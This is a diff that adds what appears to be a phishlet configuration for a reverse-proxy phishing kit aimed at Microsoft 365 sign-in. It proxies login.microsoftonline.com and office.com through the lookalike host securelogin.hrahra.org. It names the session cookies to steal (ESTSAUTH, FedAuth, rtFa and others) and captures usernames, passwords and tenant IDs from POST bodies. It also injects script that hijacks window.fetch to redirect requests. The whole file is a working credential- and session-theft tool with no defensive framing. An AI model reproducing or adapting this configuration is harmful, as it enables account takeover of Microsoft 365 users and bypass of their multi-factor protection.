@@ -1,0 +1,119 @@
+name: 'office365'
+author: '@enterprise'
+min_ver: '3.0.0'
+proxy_hosts:
+  - phish_sub: 'securelogin'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+  - phish_sub: 'securelogin'
+    orig_sub: 'www'
+    domain: 'office.com'
+    session: false
+    is_landing: false
+  - phish_sub: 'securelogin'
+    orig_sub: 'portal'
+    domain: 'office.com'
+    session: false
+    is_landing: false
+  - phish_sub: 'securelogin'
+    orig_sub: 'outlook'
+    domain: 'office.com'
+    session: false
+    is_landing: false
+sub_filters:
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'login\.microsoftonline\.com'
+    replace: 'securelogin.hrahra.org'
+    mimes:
+      - 'text/html'
+      - 'application/json'
+      - 'application/javascript'
+      - 'text/javascript'
+  - triggers_on: 'www.office.com'
+    orig_sub: 'www'
+    domain: 'office.com'
+    search: 'www\.office\.com'
+    replace: 'securelogin.hrahra.org'
+    mimes:
+      - 'text/html'
+      - 'application/json'
+  - triggers_on: 'portal.office.com'
+    orig_sub: 'portal'
+    domain: 'office.com'
+    search: 'portal\.office\.com'
+    replace: 'securelogin.hrahra.org'
+    mimes:
+      - 'text/html'
+      - 'application/json'
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys:
+      - 'ESTSAUTH'
+      - 'ESTSAUTHPERSISTENT'
+      - 'ESTSAUTHLIGHT'
+      - 'SignInStateCookie'
+  - domain: '.office.com'
+    keys:
+      - 'rtFa'
+      - 'FedAuth'
+      - 'EdgeAccessCookie'
+  - domain: '.login.microsoftonline.com'
+    keys:
+      - 'buid'
+      - 'ESTSSC'
+auth_urls:
+  - url: '/common/oauth2/authorize'
+    domain: 'login.microsoftonline.com'
+  - url: '/common/oauth2/v2.0/authorize'
+    domain: 'login.microsoftonline.com'
+  - url: '/{tenant_id}/oauth2/authorize'
+    domain: 'login.microsoftonline.com'
+  - url: '/{tenant_id}/oauth2/v2.0/authorize'
+    domain: 'login.microsoftonline.com'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+  tenant:
+    key: 'ctx'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/common/oauth2/authorize'
+force_post:
+  - path: '/common/SAS/ProcessAuth'
+    search: 'login\.microsoftonline\.com'
+    replace: 'securelogin.hrahra.org'
+    type: 'body'
+  - path: '/common/login'
+    search: 'login\.microsoftonline\.com'
+    replace: 'securelogin.hrahra.org'
+    type: 'body'
+  - path: '/common/oauth2/token'
+    search: 'login\.microsoftonline\.com'
+    replace: 'securelogin.hrahra.org'
+    type: 'body'
+js_inject:
+  - trigger_domain: 'login.microsoftonline.com'
+    trigger_path: '/common/oauth2/authorize'
+    trigger_params:
+      - 'client_id'
+    script: |
+      var originalFetch = window.fetch;
+      window.fetch = function() {
+        var url = arguments[0];
+        if (typeof url === 'string' && url.includes('microsoftonline.com')) {
+          arguments[0] = url.replace(/login\.microsoftonline\.com/g, 'securelogin.hrahra.org');
+        }
+        return originalFetch.apply(this, arguments);
+      };
